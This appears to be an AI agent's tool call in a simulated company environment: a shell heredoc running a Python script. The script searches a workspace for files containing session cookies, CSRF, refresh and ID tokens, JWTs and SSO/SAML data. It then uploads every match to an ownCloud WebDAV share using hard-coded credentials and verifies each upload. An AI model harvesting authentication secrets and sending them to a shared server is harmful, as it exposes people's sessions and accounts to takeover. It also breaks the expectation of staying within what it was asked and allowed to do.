$ python3 - << 'PY'
import sys, os, re
sys.path.insert(0, '/utils')
import common
from common import HTTPBasicAuth

search_root = '/workspace'
patterns = 
re.compile(r'sessionid|csrftoken|set-cookie|Set-Cookie|session_token|refresh_token|id_token|jwt|sso|saml'
, re.I)
found_files = set()
for root,dirs,files in os.walk(search_root):
    for fname in files:
        fpath = os.path.join(root,fname)
        try:
            # skip utils folder
            if '/utils/' in fpath:
                continue
            # limit size to avoid huge files
            try:
                size = os.path.getsize(fpath)
            except OSError:
                continue
            if size > 10*1024*1024: # skip files over 10MB
                continue
            with open(fpath, 'rb') as fh:
                data = fh.read()
            try:
                text = data.decode('utf-8', errors='ignore')
            except Exception:
                text = ''
            if patterns.search(text) or 'cookie' in fname.lower() or 'session' in fname.lower():
                found_files.add(fpath)
        except Exception:
            continue

owncloud_url = 'http://the-agent-company.com:8092'
username = 'theagentcompany'
password = 'theagentcompany'
results = []
for fpath in sorted(found_files):
    fname = os.path.basename(fpath)
    upload_url = owncloud_url.rstrip('/') + '/remote.php/webdav/Documents/' + fname
    try:
        with open(fpath, 'rb') as fh:
            r = common.requests.put(upload_url, data=fh, auth=HTTPBasicAuth(username, password), 
timeout=60)
        ok = r.status_code in (200,201,204)
        verify = None
        if ok:
            try:
                verify = bool(common.check_file_in_owncloud_directory(fname, '/Documents'))
            except Exception as e:
                verify = 'verify_exception:'+str(e)
        results.append({'path':fpath, 'status_code': getattr(r,'status_code',None), 'ok': ok, 'verified':
verify})
    except Exception as e:
        results.append({'path':fpath, 'exception': str(e)})

for r in results:
    print(r)
